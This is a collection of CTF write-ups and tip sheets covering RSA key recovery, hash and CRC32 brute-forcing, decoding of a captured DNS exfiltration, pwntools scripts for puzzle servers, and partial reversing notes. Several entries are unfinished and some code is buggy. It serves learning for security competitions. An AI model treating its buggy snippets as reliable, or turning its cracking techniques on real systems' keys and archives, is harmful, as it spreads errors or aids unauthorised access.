<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-ghafri
description: CTF writeups and security challenges by GHAFRI.
---

# Writeups by GHAFRI

Source repository: `/repos/GHAFRI`

## Repository Index

- Writeups/README.md
- Writeups/Cryptography/Notes.md
- Writeups/Forensics/Tips and Tricks.md
- Writeups/Misc/Tips and Tricks.md
- Writeups/Network/Tips and Tricks.md
- Writeups/Pwn/Tips and Tricks.md
- Writeups/Reversing/Tips and Tricks.md
- Writeups/Stegnography/Tips and Tricks.md
- Writeups/Tools/Tools.md
- Writeups/Web/Notes.md
- Writeups/Web/UAE National Cyber Security CTF Finals 2018/easymessage.md
- Writeups/Web/Shellterlabs/Forgotten/Forgotten.md
- Writeups/Web/Shellterlabs/Song_travel/song_travel.md
- Writeups/Web/Shellterlabs/banana_shopping/banana_shopping.md
- Writeups/Web/Shellterlabs/hello_admin/hello_admin.md
- Writeups/Web/Shellterlabs/memes/memes.md
- Writeups/Web/Shellterlabs/ping_test/ping_text.md
- Writeups/Web/OverTheWire/Natas/Natas12/Natas12.md
- Writeups/Web/OverTheWire/Natas/Natas13/Natas13.md
- Writeups/Stegnography/UAE National Cyber Security CTF Finals 2018/Listen Carefully/Listen Carefully.md
- Writeups/Reversing/0CTF 2018 Quals/g0g0g0.md
- Writeups/Reversing/0CTF 2018 Quals/udp.md
- Writeups/Reversing/Shellterlabs/B0mb/B0mb.md
- Writeups/Reversing/Shellterlabs/Be_Wild/Be_Wild.md
- Writeups/Reversing/Shellterlabs/Evil_Barney/Evil_Barney.md
- Writeups/Reversing/Shellterlabs/MacRevEngER/MacRevEngER.md
- Writeups/Reversing/Shellterlabs/Rev_1/Rev_1.md
- Writeups/Reversing/Shellterlabs/Rev_2/Rev_2.md
- Writeups/Reversing/Shellterlabs/access_pass/access_pass.md
- Writeups/Reversing/Shellterlabs/dont_be_a_kiddie/dont_be_a_kiddie.md
- Writeups/Reversing/Shellterlabs/need_a_slave/need_a_slave.md
- Writeups/Reversing/Shellterlabs/todo/todo.md
- Writeups/Reversing/Shellterlabs/winners/winners.md
- Writeups/Reversing/OPCDE-CTF-2108/Python_Bygones/Python_Bygones.md
- Writeups/Reversing/OPCDE-CTF-2108/ReverseMe/ReverseMe.md
- Writeups/Reversing/OPCDE-CTF-2108/bin_mirrors/bin_mirrors.md
- Writeups/Pwn/OPCDE-CTF-2018/Cracktorial/Cracktorial.md
- Writeups/Pwn/OPCDE-CTF-2018/Forever_Alone/Forever_Alone.md
- Writeups/Pwn/OPCDE-CTF-2018/NSA_Math_Test/nsa_math_test.md
- Writeups/Pwn/OPCDE-CTF-2018/What_the_math/What_the_math.md
- Writeups/Misc/OPCDE-CTF-2018/Q.R.E.A.M/QREAM.md
- Writeups/Misc/OPCDE-CTF-2018/RansomPics/RansomPics.md
- Writeups/Misc/OPCDE-CTF-2018/b33ps/b33ps.md
- Writeups/Forensics/SunshineCTF/Data Exfil/Data_Exfil.md
- Writeups/Forensics/OPCDE-CTF-2018/Dird/dird.md
- Writeups/Forensics/OPCDE-CTF-2018/Underpreassure/Underpreassure.md
- Writeups/Forensics/OPCDE-CTF-2018/flagsync/flagsync.md
- Writeups/Forensics/HITB-CTF-EDU/Flag-CRC/Flag_crc.md

## Writeup Content


### File: Writeups/README.md

# Writeups
My way to go notes for ctf competitions



### File: Writeups/Cryptography/Notes.md

# Tips and Tricks for cryptography:
## xortool
If you find multiple files that have garbage text, then your most likely need to find the probablity using `xortool file`  
if the probability is `6`, then the key is `\x06`, now use the `script.py` to append all data in files and xor with key: 
```py
from pwn import *

data = []
files = ['file1','file2','file3','file4']
key = '\x06'

for f in files:
  x = open(f, 'rb').read()
  data.append(x)

for x in data:
  print xor(data, key)
```


## RSA CTF Tool (flag and pub key)
If a problem is given with the above, then your most likely gonna use [rsactftool](https://github.com/Ganapati/RsaCtfTool)  
We first obtain the RSA Private key from the provided `key.pub`  
There are 2 methods:
### #1
```sh
cd RsaCtfTool
python2.7 RsaCtfTool.py --publickey key.pub  --private
```
We store the RSA Private key in a `private.pem`
If the flag file is in `base64` we convert it to binary file using:
```sh
echo "base64_data" | base64 -d > flag
```
Find we decrypt the private key with the flag file to get the flag:
```sh
openssl rsautl -decrypt -inkey private.pem -in flag -out flag.txt
```
### #2
With a single line from `rsactftool`:  
```sh
cd RsaCtfTool
python2.7 RsaCtfTool.py --publickey key.pub --uncipherfile flag --verbose --private
```
Notice: Flag file should be in binary format.

## RSA CTF Tool (p= q= e= c=)
If a problem is given with the above, then your most likely gonna use [rsactftool](https://github.com/Ganapati/RsaCtfTool)
To activate:  
```sh
cd RsaCtfTool
virtualenv --python=/usr/bin/python2.7 .
source bin/activate
python2.7 RsaCtfTool.py
```

## OTP or Many Time Pad Attack
This method can be explained here: [Many Time Pad Attack](https://crypto.stackexchange.com/questions/59/taking-advantage-of-one-time-pad-key-reuse)  
There are few methods I used to solve this problem:
### #1
Use `cribdrag.py` to find the key using manual analysis.
### #2
Use `featherduster` with `multi_byte_xor` module.

## Messy Text:
if you come across messy text such as this  
`A7]^gF*(u(BkVO)1MV#U/oPWADf.4LBQ&)IE+j2TD.GLe2e4XS@q%-(3+b!&3+=g#AMcDXAMuMZ@:V/M2e4jY`  
use a good source software such as `cyberchef` to decode it, and the method to do so is using `Base85`  

## Useful python code:
### Extract only Upper case from a text file
```py
data = ''.join([c for c in data_file if c.isupper()])
```
### Read from a file and store as a string:  
```py
with open('bin.txt','r') as f:
	data = f.read()
```
### Replacing data in a string:
```py
data = data.replace("ZERO","0").replace("ONE","1")
```



### File: Writeups/Forensics/HITB-CTF-EDU/Flag-CRC/Flag_crc.md

# Flag CRC - N/A
```
N/A 
However the hint was: CRC32
```
[CTF File](https://github.com/GHAFRI/Writeups/blob/master/Forensics/HITB-CTF-EDU/Flag-CRC/flag_0cdc286d10e7ba95570b27e2ead3fc31.zip)
## Solution

We were given a zip file that is encrypted with a password. We first run
```
unzip -v flag.zip
```
to check for file information, and we recieve

![1](https://github.com/GHAFRI/Writeups/blob/master/Forensics/HITB-CTF-EDU/Flag-CRC/1.png)

We can see we have a `CRC32` in the given file. After googling CRC cracker, we obtain a `cracker.py` from [Zip CRC Cracker](https://github.com/kmyk/zip-crc-cracker) code to extract the hidden text from the `CRC32` format.

![2](https://github.com/GHAFRI/Writeups/blob/master/Forensics/HITB-CTF-EDU/Flag-CRC/2.png)

Ordering it based from flag0 to flag3 and we get `flag{easy_crc32_crack}`

### What I learned

You can extract data from CRC32 of a zip file.



### File: Writeups/Forensics/OPCDE-CTF-2018/Dird/dird.md

# Dird - 300
```
Dirds are birds with dog heads. I don't think they have thumbs, though.
Flag is in format: flag{...}
```
## Solution

We were given a doge bird image to look for the flag. We tried looking through `binwalk`, `exif` and even `Stegsovl` for an hidden things with no clue. Then we looked into using online sites even though we don't work that way, but we thought maybe a site can show us more like `http://exif.regex.info`. So we hooked that up and we got

![1](https://github.com/GHAFRI/Writeups/blob/master/Forensics/OPCDE-CTF-2018/Dird/1.png)

So, the flag is `flag{Tider Dirden}`

### What I learned

Check the thumbnails too.



### File: Writeups/Forensics/OPCDE-CTF-2018/Underpreassure/Underpreassure.md

# Under Pressure - 100
```
I have been asked to explain the difference between encoding and compression in a job interview. 
I guess people confuse the two?

Flag is in format: flag{...}
```

## Solution

As simple as this problem is, we are given a `Txt` file with a `Base64` text
```
TmljZSB3b3JrIGRlY29kaW5nIHRoaXMuIFRoaW5ncyBzdGlsbCBmZWVsIGEgbGl0dGxlIGNvbXByZXNzZWQuCh+LCAi3Dt1YAANjb21wcmVzc2VkAEvLSUyvds7PLSgyLi7ONMiLT8xziXfNSzZIycxzj08MSo1PyXRzMy4yziuJL8nI9Es3reUCABG/Ca00AAAA
```
We convert it ASCII and we get
```
Nice work decoding this. Things still feel a little compressed.
XcompressedKILv-(2..4ȋOswK6HsOJOts3.2+/K7	4
```
It seems like a `file code`, so we take `decode` it again, but this time into a `.bin` file and we open it in to `HxD` we get
```
.‹..·.ÝX..compressed.KËIL¯vÎÏ-(2..Î4È‹OÌs‰wÍK6HÉÌs.O.J.OÉts3.2Î+‰/ÉÈôK7.å...¿..4...
```
`.<.` is a file signature for a `gzip` compression, so we change `.bin` to `.gz` and we open it.
We find a file and in that file we get the flag
```
Thanks for playing CTF.  
Capturing flags is fun!  Here is your flag:  flag{Compr3ssi0n_anD_Enc0dinG_aRe_diFF3r3nt_thiNg5}
```

### What I learned 

Never copy file formats from a decoder directly to a hex editor.
Let that decoder convert directly to a file for you so you dont lose important variables such as `<` which could correupt your files.



### File: Writeups/Forensics/OPCDE-CTF-2018/flagsync/flagsync.md

# Flagsync - 200
```
Developers have a history of combining code and data.
Flag is in format: flag{...}
```

## Soltion

We are given a folder that has a `python code.py`, a `README.cd` and a hidden folder `.git`
In the `python.py` we see this
```
# Read connection details for host and port
	# DO NOT hardcode the flag here
        host = str(os.environ['FLAG_HOST'])
        port = int(os.environ['FLAG_PORT'])
        flag = str(os.environ['FLAG_FLAG'])

        # Connect to remote service
        s = socket.socket()
        s.connect((host, port))

        # Send flag and close the connection
        s.send(flag)
        s.close()
```
So, we thought that we needed to look around for the `host` and the `port` of the connection and retrieve the flag from the `server`.
But, this is a `forensics problem`, this cant be it, so we started looking around for the flag.
We didnt find it, but we found a `clue`. In .git/logs/HEAD.md we find this
```
Moved to using git -- mercurial was Peter's idea anyways.
```

A good program for `Mercurial` we know of is `Tortoise Workbench`. 
So, we imported the directory of the flagsync to the program and we see

![1](https://github.com/GHAFRI/Writeups/blob/master/Forensics/OPCDE-CTF-2018/flagsync/1.png)

It looks like the `commitment history list` of what is happening.
If we look at what `commit` peter placed before he was fired, we see

![2](https://github.com/GHAFRI/Writeups/blob/master/Forensics/OPCDE-CTF-2018/flagsync/2.png)

so, the flag is `flag{Develop3rs_Dev3l0pers_D3velop3rs_Devl0p3rs!}`
 
### What I learned

You can find previous commitments if you look hard enough or used the right tools.



### File: Writeups/Forensics/SunshineCTF/Data Exfil/Data_Exfil.md

# Data Exfil
```
We think a critical document has been stolen out of our network, luckily our next gen IDS managed to capture the traffic during the attack. 
Can you tell us what they took?
Author: Medic-
```
## Solution

We have a folder that contains a `pcap` file and some `.log` files.
If we check the pcap file we wont find anything intresting so we switch to one of the `log` files starting with `dns.log`.
We see that some `proto count` have IP `8.8.8.8` and some have IP of `54.175.216.124`.
Then when we look to the right, we see some `hex` code.
```
504b030414000000000030be774c973a10791e0000001e0000000a000000.cozybear.group
7365637265742e74787473756e7b7730775f495f646e735f7333335f7930.cozybear.group
755f316e5f683372337d504b0102140014000000000030be774c973a1079.cozybear.group
1e0000001e0000000a000000000000000100200000000000000073656372.cozybear.group
```
If we take that `hex` code to any hex editor we can see
```
PK........0wL:.y............secret.txtsun{w0w_I_dns_s33_y0u_1n_h3r3}PK..........0wL:.y.................. .......secr
```

So the flag is: sun{w0w_I_dns_s33_y0u_1n_h3r3}




### File: Writeups/Forensics/Tips and Tricks.md

# Tips and tricks for forensics challanges:
## Compressed Files
### Gz
`tar -xvf file.gz`
## Binwalk
### Binwalk All
`binwalk --dd='.*'`
## Grep
### Grep Everything
To `grep flag` from a folder, we use:  
`grep -rl "flag" folder` or `grep -Hrn "flag" folder`  
### Grep Above and Below
To grep above and below, use `C1`:  
`strings file | grep flag C1`



### File: Writeups/Misc/OPCDE-CTF-2018/Q.R.E.A.M/QREAM.md

# Q.R.E.A.M. - 400
```
I can't think of a clever description. 
Just follow the trail -- but there's no telling how deep the rabbit hole goes.

Flag is in format: flag{...}
```

## Solution

Basically, here we see `QR code` image file that we just need to scan.
This redirects us to an `Imgur` link, which also has another `QR` which also redirects to an `Imgur` link that also has another `QR` code and so on. As simple as it looks, new players will just go down the rabbit hole manually and from experience I know how far that rabbit hole can go when they coded the question.

So to reverse this, we created a very simple QR python code that downloads the `Imgur` image and reads it then go to that link again in a loop.
```Python
from pyzbar.pyzbar import decode
from PIL import Image
import numpy as np
from urllib import request

while True:
    x = decode(Image.open(r'C:\1.jpg'))
    y = ''.join(map(str,x))
    z = y.split("'")
    img = z[1]
    request.urlretrieve(img,r"C:\1.jpg")
```

After this code, we will recieve a URL error
```Python
    raise ValueError("unknown url type: %r" % self.full_url)
ValueError: unknown url type: 'flag{QR_Rules_Everything_Around_Me_QREAM}'
```

Simply, the flag is `flag{QR_Rules_Everything_Around_Me_QREAM}`

### What I learned

Nothing, it's so simple.





### File: Writeups/Misc/OPCDE-CTF-2018/RansomPics/RansomPics.md

# RansomPics - 200
```
Help! Some ransomware encoded and renamed all of our image files. 
We need this one right away!

Flag is in format: flag{...}
```

## Solution

### What I learned


### File: Writeups/Misc/OPCDE-CTF-2018/b33ps/b33ps.md

# b33ps - 300
```
Remember the good old days when the signal was in the sound? My first modem was 1200 baud, dialing into Bell systems. 
Kids these days don't know what they're missing.
Flag is in format: flag{...}
```

## Solution

As the question says, we needed to look into a `modem` that is `1200 baud` and decode it from there. The only library that does that is [Minimodem](http://www.whence.com/minimodem/). So we downloaded the library and used this command

```
Input: minimodem --rx -f b33ps.flac 1200
Output:
### CARRIER 1200 @ 1200.0 Hz ###
H4sIAAd6cFYAAwvJSMzLLlZIyy9SKMhJrMzMS1dwDnHTU1BwTiwoKS0C8dNyEtOLFTKBikrzFBUUPFKLUkG8yvzSIrCclQKYqk4yNi6ITzIwKIgvzgCRKYnx5SBGLQA4hOrLZAAAAA==
### NOCARRIER ndata=140 confidence=4.847 ampl=1.001 bps=1200.00 (rate perfect) ###
```
Its a Base64 code, so we decode it to a file. The file has a `signiture` of `.<.` so it's basically a `gzip` format. So we add `.gz` and we get
```
Thanks for playing CTF.  Capturing flags is fun!  Here is your flag:  flag{b33p_b00p_sh00p_da_wh00p}
```

So the flag is `flag{b33p_b00p_sh00p_da_wh00p}`

### What I learned

Kali has some really intresting libraries that I should look into, such minimodem that I never heard about before.



### File: Writeups/Misc/Tips and Tricks.md

# Tips and tricks I used to solve Misc
## Uppercase Bash
If you come accross a bash that takes in `ls` as `LS: command not found` then execute `$0` to return to normal bash.

## GPS
### GPS Coordination
If you have a file with GPS locations, use this website [GPS Visualizer](http://www.gpsvisualizer.com/) to extract data from gps points.



### File: Writeups/Network/Tips and Tricks.md

# Here is the list of tips I used for networking:
## TTH Hashsum File
If you `binwalk` pcap file you might come across a file that looks like this:
```xml
<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<FileListing Version="1" CID="AH3KWVYA5DAWJA7HAVHXC6BCLPNG34PVQVMPXPY" Base="/" Generator="EiskaltDC++ 2.2.9">
<Directory Name="dcpp">
	<File Name="text" Size="9" TTH="CA4CMF34SHRUQIBG6MNRDAI5BVT7HQQRTGC7TBA"/>
</Directory>
</FileListing>
```
This means that the flag is in a `flag.txt` file that has a `TTH hashsum` that is `9` bytes.  
To solve this we use a `bruteforcer.py` script that uses the OS library to excute shell of [rhash](https://github.com/rhash/RHash) and uses a python library [brute](https://github.com/rdegges/brute) (its python2):  
```py
import os
from brute import brute

flag = "CA4CMF34SHRUQIBG6MNRDAI5BVT7HQQRTGC7TBA".lower()
print("[+] Brute Forcing TTH Hash")
for b in brute(length=4, letters=True, numbers=True, symbols=False):
	p = os.popen('printf "CTF{'+b+'}\n" | rhash --tth -')
	s = p.read()
	s = s[:s.find(" ")]
	if s == flag:
		print("[+] FLAG FOUND")
		print("Flag is: "+b)
		break
```
Notice: This will take few seconds for 2 bytes, minutes for 3 bytes and maybe hours for 4 bytes.

## Kindle SP01
If you spot a header in a pcap file under the word `SP01` that means you need to use [This](https://github.com/NiLuJe/KindleTool):
```
kindletool dm file.pcap out
```
Then we just `binwalk` it to find what we need.

## SSL:

If an SSL `key` file exists in the `pcap` file, add it to the `Edit->Preferences->Protocols->SSL` key list and specify a certain `IP`, `port` and `protocol` to decrypt the SSL.



### File: Writeups/Pwn/OPCDE-CTF-2018/Cracktorial/Cracktorial.md

# Cracktorial - 400
```
The Cracktorial service generates a random number of factorials with a base between 100,000 and 500,000. Send back the base for each factorial.
Example: 4! = 24. You would receive 24, then send back the base of 4.
The service is at services.opcde-ctf.propervilla.in on port 10000/tcp.
Flag is in format: flag{...}

Hint: Try first connecting manually to the service, e.g:

$ nc -v services.opcde-ctf.propervilla.in 10000
```
## Solution

When we connect to netcat we get
```
DNS fwd/rev mismatch: services.opcde-ctf.propervilla.in != ec2-52-57-139-149.eu-central-1.compute.amazonaws.com
services.opcde-ctf.propervilla.in [52.57.139.149] 10000 (webmin) open
```
After almost 1 min, we get a huge list of values = 2 MB in size.
To solve this algorithm we created a function that takes in the large factorial, and then finds the base of it.
We also used `PwnTools` for this problem to `send` and `recieve` the information from the server.
The problem was that every time we `send` the `base` and recieve the next `factorial` my terminal runs out of memory.

### What I learned

You can utlize other languages like `C` to create faster algorithms to solve the problem.



### File: Writeups/Pwn/OPCDE-CTF-2018/Forever_Alone/Forever_Alone.md

# Forever Alone - 100
```
You used to call the Forever Alone daemon on its cell phone. Late night when you needed its love. Now it just sends out blobs of characters with only one unique character per blob. Send back that one unique character.
The service is at services.opcde-ctf.propervilla.in on port 10001/tcp.
Flag is in format: flag{...}
Hint: Try first connecting manually to the service, e.g:

$ nc -v services.opcde-ctf.propervilla.in 10001
```
If run it with netcat we get

```
ghafri@DESKTOP-A2T99C4:/mnt/c/Users/GHAFRI$ nc -v services.opcde-ctf.propervilla.in 10001
DNS fwd/rev mismatch: services.opcde-ctf.propervilla.in != ec2-52-57-139-149.eu-central-1.compute.amazonaws.com
services.opcde-ctf.propervilla.in [52.57.139.149] 10001 (?) open
Forever Alone :(  Generating blobs.
--> A Huge Garbage Characters <--
```
## Solution	

In `--> A Huge Garbage Characters <--` there is a large paragraph of characters that looks weird on github so I removed it.
As simple as it is, we just need to create a program that fetches that garbage -> string and then use an algorithm that compares the first charachter with the rest, if there is a duplicate, the index of the first character goes to the next and so on. If index comparision reaches the end with no duplicates, it just sends its character to the server and recieve the next set of garbage. After almost 20 loops we get

```Python
# Importing Libraries
from pwn import *
import numpy as np
import math

# Server connect
r = remote('services.opcde-ctf.propervilla.in', 10001)
# Get data from the server
data = []
arr = []
#while r.can_recv():
data = r.recvline("\n")
data = r.recvuntil("\n").split("\n")
print data
print len(data)
str2 = data[0]

#Function to check non-repeated characters
NO_OF_CHARS = 256
 
# Returns an array of size 256 containg count
# of characters in the passed char array
def getCharCountArray(string):
    count = [0] * NO_OF_CHARS
    for i in string:
        count[ord(i)]+=1
    return count
 
# The function returns index of first non-repeating
# character in a string. If all characters are repeating
# then returns -1
def firstNonRepeating(string):
    count = getCharCountArray(string)
    index = -1
    k = 0
 
    for i in string:
        if count[ord(i)] == 1:
            index = k
            break
        k += 1
 
    return index
 
# Driver program to test above function
string = str2
index = firstNonRepeating(string)
if index==1:
    print "Either all characters are repeating or string is empty"
else:
    print "First non-repeating character is " + string[index]

#Sends back to server
r.send(string[index])

# Loop to repeat
while True:
	data = r.recv()
	print data
	index = firstNonRepeating(data)
	r.send(data[index])
r.interactive
```

### What I learned

Using pwntools.



### File: Writeups/Pwn/OPCDE-CTF-2018/NSA_Math_Test/nsa_math_test.md

# NSA Math Test - 300
```
Public key crypto is built on the inability to factor large relative primes quickly. Given a relative prime N, find the two prime numbers whose product is N. Submit solutions as a space-separated pair, for example:
9001 9187
The service is at services.opcde-ctf.propervilla.in on port 10010/tcp.
Flag is in format: flag{...}
Hint: Try first connecting manually to the service, e.g:
$ nc -v services.opcde-ctf.propervilla.in 10010
```
We connect to the server we get
```Lunix
DNS fwd/rev mismatch: services.opcde-ctf.propervilla.in != ec2-52-57-139-149.eu-central-1.compute.amazonaws.com
services.opcde-ctf.propervilla.in [52.57.139.149] 10010 (?) open
Welcome to NSA Math Test!  Generating relative primes.
Which two primes give you the product: 64706487147923
```

## Solution

Just like the question asked we need to find `two prime numbers whose product is N` which is given to us from the server.

```Python
# Importing Libraries
from pwn import *
import numpy as np
import math

# Function to compare factors with their product
def factors(number):
	return [[x, number / x] for x in range(int(math.sqrt(number)))[2:] if not number %x]

# connect to netcat server
r = remote('services.opcde-ctf.propervilla.in', 10010)
# Retrieve data from the server
data = []
arr = []
#while r.can_recv():
data = r.recvline("\n")
data = r.recvuntil("\n").split("\n")
print data
print len(data)

str2 = data[0]
arr2 = str2.split(": ")
total = arr2[1]
print total
man = int(total)
animal = factors(man)
print animal
str1 = str(animal[0])
arr1 = str1.split(",")
print arr1
str2 = arr1[0]
arr2 = str2.split("[")
one = arr2[1]
print one
str3 = arr1[1]
arr3 = str3.split("]")
t =  arr3[0]
t = t.split(" ")
t = t[1]
two = t
print two

one = str(one)
two = str(two)

# Send data to the server
r.send(one + " " + two )

# Loop the requests
while True:
	data = r.recvuntil("\n").split("\n")
	print data
	print len(data)
	str2 = data[0]
	arr2 = str2.split(": ")
	total = arr2[1]
	print total
	man = int(total)
	animal = factors(man)
	print animal
	str1 = str(animal[0])
	arr1 = str1.split(",")
	print arr1
	str2 = arr1[0]
	arr2 = str2.split("[")
	one = arr2[1]
	print one
	str3 = arr1[1]
	arr3 = str3.split("]")
	t =  arr3[0]
	t = t.split(" ")
	t = t[1]
	two = t
	print two

	one = str(one)
	two = str(two)

	r.send(one + " " + two )
# To output the flag  
r.interactive
```

### What I learned

- [x] More into pwntools.




### File: Writeups/Pwn/OPCDE-CTF-2018/What_the_math/What_the_math.md

# What The Math? - 200
```
Given a sum N and an array of integers, find two entries in the array whose sum is N. Submit solutions as a space-separated pair, for example:
7638 49278
The service is at services.opcde-ctf.propervilla.in on port 10011/tcp.

Flag is in format: flag{...}

Hint: Try first connecting manually to the service, e.g:

$ nc -v services.opcde-ctf.propervilla.in 10011
```
If we run it on the server we get
```Lunix
nc -v services.opcde-ctf.propervilla.in 10011
DNS fwd/rev mismatch: services.opcde-ctf.propervilla.in != ec2-52-57-139-149.eu-central-1.compute.amazonaws.com
services.opcde-ctf.propervilla.in [52.57.139.149] 10011 (?) open
What The Math?!  Generating sums.
Sum: 3501437660
Array: [874374497, 1177141672, 2734670124, 3321106123, 3148907970, 1207766601, 2168731613, 3235563495, 3677087619, 362458009, 557642715, 3668637605, 970134770, 196404589, 3970550850, 135790669, 2339209263, 2967191303, 1225017450, 2919315105, 4215398585, 60091764, 377123456, 70297931, 1861267997, 807939626, 2211629714, 2809459926, 3831405279, 4218981033, 360650129, 4078517047, 2195160123, 2546556525, 944371513, 108347537, 2528363986, 3426035847, 2579055383, 1637436806, 4265224326, 1080672472, 1663514078, 4011189970, 127178734, 247850352, 3597387598, 240404665, 1233932138, 3318786289, 3661830776, 747062322, 198783222, 418739991, 2465188197, 2263981307, 3693309011, 1424678299, 3477581488, 1921942237, 1661203517, 4277070380, 1640430955, 2130830647, 2778187786, 3431139729]
```

## Solution


The solution we used is
```Python
# Importing Libraries
from pwn import *
import numpy as np

# Connecting to the Server
r = remote('services.opcde-ctf.propervilla.in', 10011)

# Get data from the server
data = []
arr = []
data = r.recvuntil("]").split("\n")
print data
print len(data)
str2 = data[1]
arr2 = str2.split(" ")
total = arr2[1]
print total
str3 = data[2]
arr = str3.split("]")
arr.pop()
str3 = arr[0]
arr = str3.split("[")
str3 = arr[1]
val = str3.split(",")
print val
print len(val)
s = set()
# Function to Compare
for i in range(0,len(val)):
	temp = int(total)-int(val[i])
	if (temp>=0 and temp in s):
   		shit = val[i]
    		shitt = temp
	s.add(int(val[i]))

newshit = shit.split(" ")
shit = newshit[1]
print shit
print shitt
print(type(shit))
print(type(shitt))
ass = str(shitt)

# Send back to the server
r.send(shit + " " + ass )
r.recv()

#Looping the pwn
while True:
	data = r.recvuntil("]").split("\n")
	print data
	print len(data)
	str2 = data[0]
	arr2 = str2.split(" ")
	total = arr2[1]
	print total
	str3 = data[1]
	arr = str3.split("]")
	arr.pop()
	str3 = arr[0]
	arr = str3.split("[")
	str3 = arr[1]
	val = str3.split(",")

	print val
	print len(val)
	s = set()
	for i in range(0,len(val)):
		temp = int(total)-int(val[i])
		if (temp>=0 and temp in s):
	   		shit = val[i]
	    		shitt = temp
		s.add(int(val[i]))
	
	newshit = shit.split(" ")
	shit = newshit[1]
	print shit
	print shitt
	print(type(shit))
	print(type(shitt))
	ass = str(shitt)

	r.send(shit + " " + ass )
	r.recvline()
r.interactive()
```

### What I learned
Nothing



### File: Writeups/Pwn/Tips and Tricks.md

# Tips and tricks used to solve pwn challanges:
## Python Help
Try using `help(flag)` in python pwn script, maybe it will give you `No Python documentation found for 'flag{flag_here}`
## Scripting:
### eval()
`eval()` can help in compution equations without specifiying the terms.

## checksec
`apt-get install checksec`  
This helps to check the protection on executables.  
-- https://github.com/slimm609/checksec.sh  

## import pexpect
Its an intresting python library that can be used instead of `import pwn` that could potentionally help in solving some future challanges.



### File: Writeups/Reversing/0CTF 2018 Quals/g0g0g0.md

# g0g0g0

mdZero says that he has tons of excellent tools. However, he has never showed his magic to us before. 
"They are all stored in my mobile HDD. At home, not here". That's what he told us when we were asking, every time! 
Once, we forced him to tell us, or he would be sent to cops. 
Then he take out [this one](https://github.com/GHAFRI/Writeups/blob/master/Reversing/0CTF%202018%20Quals/g0g0g0.tar.gz) from his pocket. 
Could you help me to figure out what is it?

To verify your answer, please visit: 

`nc 202.120.7.206 13337`

## Under Progress:

So we checked the `trace.log` file and we find that its just a trace file for `golang` of the file `gogo.go`
Without any leads of how to understand what is going on in this file we check `nc 202.120.7.206 13337`
It gives us

```
sha256(XXXX+ZXhraa4di29iwSSH) == 90ba2f0303491d93b769ae06bdc85d61af7c62bb9cc6ea6224e892753c25d1a9
Give me XXXX ([A-Za-z0-9]{4}, please do not ends with "\n"):
```
This basically tell us that we have to input 4 characters as the XXXX which can be added to `ZXhraa4di29iwSSH` which then is encrypted to
`90ba2f0303491d93b769ae06bdc85d61af7c62bb9cc6ea6224e892753c25d1a9`

The `ZXhraa4di29iwSSH` and `90ba2f0303491d93b769ae06bdc85d61af7c62bb9cc6ea6224e892753c25d1a9` are always random everytime we try to run it so we wrote a python code to figure out the `key`

```
import hashlib
from itertools import product
from string import ascii_letters, digits

for i in product(ascii_letters + digits, repeat=4):
    key = ''.join(i)
    str = hashlib.sha256(key + "ZXhraa4di29iwSSH").hexdigest()
    if str == "90ba2f0303491d93b769ae06bdc85d61af7c62bb9cc6ea6224e892753c25d1a9":
        print key

```

Then we generate new hashes and replace them in the code as soon as we run the `nc` to get the `key`. Once we generate the correct `key` for the `XXXX` we input that in the terminal and we get

`Input 3 numbers`

and the program exits.

We found that string in the `trace.log` file but we cant seem to understand or read the trace file.



### File: Writeups/Reversing/0CTF 2018 Quals/udp.md

# UDP

too many [udp]()

## Under Progress

So we get the `udp` file which is an `ELF 64-bit LSB executable`
We open the file in `IDA` and we see that there are alot of exits

When we attemp to run the file using `./udp` we get

```
setup worker 0
setup worker 1
setup worker 2
...
setup worker 63
setup worker 64
[ERROR]
```

Then we look back at `main` code in `IDA` we can see

![1](https://github.com/GHAFRI/Writeups/blob/master/Reversing/0CTF%202018%20Quals/1.png)

which means the flag is a `long integer` however to get to this point we have alot of Errors and Exists





### File: Writeups/Reversing/OPCDE-CTF-2108/Python_Bygones/Python_Bygones.md

# Python Bygones - 400
```
It's only 3 lines of code.

Flag is in format: flag{...}
```

## Solution

At first look, this looks very hard for begginers but for us, it was pretty simple. One suggested way was to solve it was to run the python code into `IDLE and shell`, then just attempt to get the flag using a `print function` in the code. But we figured we just debug it using `ltrace` or `dbg`. So we first run `ltrace` to see what is happening, when we reached the end we know that the flag's begining is `flag` so we inputed `flag` and clicked `ENTER`. Once we reached the end we looked through the interface backwards until we reached this

```
emcpy(0x7f4a777c3c6c, "t", 1)                                            = 0x7f4a777c3c6c
memcpy(0x7f4a777c3c6d, "t3rs_and_numb3rs_are_ov3rrat3d}", 31)             = 0x7f4a777c3c6d
memcpy(0x7f4a777c3c24, "3", 1)                                            = 0x7f4a777c3c24
memcpy(0x7f4a777c3c25, "tt3rs_and_numb3rs_are_ov3rrat3d}"..., 32)         = 0x7f4a777c3c25
memcpy(0x7f4a777c3c6c, "l", 1)                                            = 0x7f4a777c3c6c
memcpy(0x7f4a777c3c6d, "3tt3rs_and_numb3rs_are_ov3rrat3d"..., 33)         = 0x7f4a777c3c6d
memcpy(0x7f4a777c3c24, "{", 1)                                            = 0x7f4a777c3c24
memcpy(0x7f4a777c3c25, "l3tt3rs_and_numb3rs_are_ov3rrat3"..., 34)         = 0x7f4a777c3c25
memcpy(0x7f4a77703464, "g", 1)                                            = 0x7f4a77703464
memcpy(0x7f4a77703465, "{l3tt3rs_and_numb3rs_are_ov3rrat"..., 35)         = 0x7f4a77703465
memcpy(0x7f4a777034b4, "a", 1)                                            = 0x7f4a777034b4
memcpy(0x7f4a777034b5, "g{l3tt3rs_and_numb3rs_are_ov3rra"..., 36)         = 0x7f4a777034b5
memcpy(0x7f4a77703464, "l", 1)                                            = 0x7f4a77703464
memcpy(0x7f4a77703465, "ag{l3tt3rs_and_numb3rs_are_ov3rr"..., 37)         = 0x7f4a77703465
memcpy(0x7f4a777034b4, "f", 1)                                            = 0x7f4a777034b4
memcpy(0x7f4a777034b5, "lag{l3tt3rs_and_numb3rs_are_ov3r"..., 38)         = 0x7f4a777034b5
free(0x7fffee869a20)                                                      = <void>
memcpy(0x7f4a778d2c30, "\0\0\0\0\0\0\0\0\300MpwJ\177\0\0\376\377\377\377\377\377\377\377\001\0\0\0\0\0\0\0"..., 496) = 0x7f4a778d2c30
memset(0x7f4a777cf158, '\0', 64)                                          = 0x7f4a777cf158
memset(0x7f4a777093b8, '\0', 24)                                          = 0x7f4a777093b8
memset(0x7f4a777095a8, '\0', 32)                                          = 0x7f4a777095a8
strcmp("_", "_")                                                          = 0
